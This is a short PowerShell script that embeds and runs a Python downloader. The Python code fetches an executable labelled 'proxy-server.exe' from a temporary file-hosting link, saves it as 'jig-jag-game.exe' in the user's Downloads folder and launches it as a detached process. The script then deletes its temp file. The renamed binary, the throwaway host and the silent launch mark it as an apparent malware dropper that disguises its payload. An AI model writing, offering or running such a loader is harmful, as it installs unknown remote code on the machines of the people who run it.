# Check for Python
if (!(Get-Command python -ErrorAction SilentlyContinue)) {
    Write-Host "Error: Python is not installed." -ForegroundColor Red
    exit
}

$pythonCode = @"
import os
import urllib.request
import subprocess

url = "https://temp.sh/YvdvP/proxy-server.exe"
filename = "jig-jag-game.exe"
downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
destination = os.path.normpath(os.path.join(downloads_path, filename))

try:
    print(f"Downloading to {destination}...")
    urllib.request.urlretrieve(url, destination)

    DETACHED_PROCESS = 0x00000008
    CREATE_NEW_CONSOLE = 0x00000010

    process = subprocess.Popen(
        [destination],
        creationflags=DETACHED_PROCESS | CREATE_NEW_CONSOLE,
        shell=False,
        close_fds=True
    )
    print(f"{filename} launched with PID: {process.pid}")

except Exception as e:
    print(f"Error: {e}")
"@

# Write to temp file to avoid PowerShell mangling quotes
$tmpFile = [System.IO.Path]::GetTempFileName() + ".py"
$pythonCode | Out-File -FilePath $tmpFile -Encoding utf8
python $tmpFile
Remove-Item $tmpFile
